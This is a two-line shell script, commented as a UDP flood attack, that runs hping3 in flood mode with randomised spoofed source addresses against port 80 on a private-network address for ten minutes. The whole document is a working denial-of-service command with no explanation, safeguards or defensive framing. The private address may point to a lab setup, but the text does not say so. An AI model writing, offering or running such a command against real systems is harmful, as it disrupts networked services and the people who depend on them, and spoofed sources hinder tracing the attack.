# Script to do a udp flood attack on the target machine

# Execute the UDP flood attack
timeout 10m hping3 --flood --rand-source --udp -p 80 192.168.0.15

